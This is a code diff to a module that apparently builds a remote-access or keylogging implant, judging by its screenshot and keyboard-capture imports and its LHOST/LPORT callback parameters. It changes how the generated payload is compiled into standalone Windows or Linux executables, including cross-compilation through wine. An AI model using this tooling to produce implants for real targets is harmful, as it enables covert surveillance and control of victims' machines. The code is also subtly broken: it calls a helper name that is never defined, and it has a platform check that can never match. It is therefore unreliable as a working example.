@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 import time
-import os
+import os, sys
 import pyscreenshot
 import pynput
 
@@ -132,24 +132,54 @@ class BSModule(mod.BSModule):
         with open('tmp.py', 'w') as s:
             for line in src:
                 s.write(line + '\n')
-        if py2exe and platform.lower() == 'windows':
-            if not self.py2exe_windows(LHOST, LPORT, out_dir, filename):
-                bc.err("Failed to compile with py2exe. Check setup instructions for Wine on Python 3.4")
-                return False
-            else:
-                bc.success("Complied with py2exe!")
-        elif pyinstaller and platform.lower() == 'windows':
-            if not self.pyinstaller_windows(LHOST, LPORT, out_dir, filename):
-                bc.err("Failed to compile with pyinstaller. Check setup instructions for Wine on Python.")
-                return False
-        elif platform.lower() == 'linux':
+
+        #Cross compile options first
+        #Rule out py2exe on linux - not required but belt and braces
+        if py2exe and platform.lower() == 'linux':
+            bc.err("Py2exe does not support Linux. Sorry.")
+            return False
+
+        #Linux to windows first
+        if sys.platform == 'linux' and platform.lower() == 'windows':
             if py2exe:
-                bc.warn("Pyinstaller is the only supported Linux installer, switching from py2exe.")
-            if not self.pyinstaller_linux(LHOST, LPORT, out_dir, filename):
-                bc.err("Failed to compile with pyinstaller. Check setup instructions for Wine on Python.")
-                return False
-            else:
-                bc.success("Complied with pyinstaller!")
+                if not self.py2exe_linux_2_win(LHOST, LPORT, out_dir, filename):
+                    bc.err("Failed to compile with py2exe. Check setup instructions for Wine on Python 3.4")
+                    return False
+                else:
+                    bc.success("Complied with py2exe!")
+            elif pyinstaller:
+                if not self.pyinstaller_linux_2_win(LHOST, LPORT, out_dir, filename):
+                    bc.err("Failed to compile with pyinstaller. Check setup instructions for Wine on Python.")
+                    return False
+                else:
+                    bc.success("Complied with pyinstaller!")
+
+        #Now Windows to linux
+        elif sys.platform == 'win32' and platform.lower() == 'linux' and pyinstaller:
+            if pyinstaller:
+                if not self.pyinstaller_wins_2_linux(LHOST, LPORT, out_dir, filename):
+                    bc.err("Failed to compile with py2exe. Check setup instructions for Ubuntu on WSL.")
+                    return False
+                else:
+                    bc.success("Complied with pyinstaller!")
+
+        #Otherwise it's homogeneous compilation
+        elif (sys.platform == 'linux' and platform.lower() == 'linux') or (
+                sys.platform == 'win32' and platform.lower() == 'windows'):
+            if py2exe and sys.platform == 'windows':
+                if not self.py2exe_same_same(LHOST, LPORT, out_dir, filename):
+                    bc.err("Failed to compile with py2exe.")
+                    return False
+                else:
+                    bc.success("Complied with py2exe!")
+            elif pyinstaller:
+                if not self.pyinstaller_same_same(LHOST, LPORT, out_dir, filename):
+                    bc.err("Failed to compile with pyinstaller.")
+                    return False
+                else:
+                    bc.success("Complied with pyinstaller!")
+
+        #Maybe there's something else
         else:
             bc.err("No valid install options for platform : {}".format(platform))
             return False
@@ -186,7 +216,7 @@ class BSModule(mod.BSModule):
 
     ################################ HELPERS #################################
 
-    def py2exe_windows(self, LHOST, LPORT, out_dir, filename):
+    def py2exe_linux_2_win(self, LHOST, LPORT, out_dir, filename):
         src = []
         src.append("from distutils.core import setup")
         src.append("import py2exe")
@@ -205,7 +235,7 @@ class BSModule(mod.BSModule):
             return False
         return True
 
-    def pyinstaller_windows(self, LHOST, LPORT, out_dir, filename):
+    def pyinstaller_linux_2_win(self, LHOST, LPORT, out_dir, filename):
         try:
             #command = "wine pyinstaller -F -w {}".format(self.src_dir + filename)
             command = "wine pyinstaller -F -c --paths=./  --distpath {} --workpath {} \
@@ -222,7 +252,46 @@ class BSModule(mod.BSModule):
             return False
         return True
 
-    def pyinstaller_linux(self, LHOST, LPORT, out_dir, filename):
+    def pyinstaller_same_same(self, LHOST, LPORT, out_dir, filename):
+        try:
+            #command = "wine pyinstaller -F -w {}".format(self.src_dir + filename)
+            command = "pyinstaller -F -c --paths=./  --distpath {} --workpath {} \
+                    --specpath {} {} -n {} {}".format(\
+                    self.bin_dir, self.src_dir, self.src_dir,self.hidden_imports, \
+                     filename  , 'tmp.py')
+            os.system(command)
+            output = ''
+            if 'pyinstaller: error' in output:
+                bc.err("Could not compile :\n{}".format(output))
+                return False
+        except:
+            bc.err("Could not do straight pyinstaller compile")
+            return False
+        return True
+
+    def py2exe_same_same(self, LHOST, LPORT, out_dir, filename):
+        bc.err("Py2Exe not yet supported.")
+        return False
+        src = []
+        src.append("from distutils.core import setup")
+        src.append("import py2exe")
+        src.append("print('about to run setup')")
+        src.append("setup(console=['{}'])".format(self.src_dir + filename + '.py'))
+        #src.append("setup(console=['{}'])".format(filename + '.py'))
+        with open(self.src_dir + 'setup.py', 'w') as s:
+            for line in src:
+                s.write(line + '\n')
+        #Nopw compile dat file
+        try:
+            command = "py -3.4 {} py2exe".format(self.src_dir + 'setup.py')
+            os.system(command)
+        except:
+            bc.err("Could not cross compile for windows")
+            return False
+        return True
+
+
+    def pyinstaller_win_2_linux(self, LHOST, LPORT, out_dir, filename):
         try:
             #command = "wine pyinstaller -F -w {}".format(self.src_dir + filename)
             command = "pyinstaller -F -c --paths=./  --distpath {} --workpath {} \
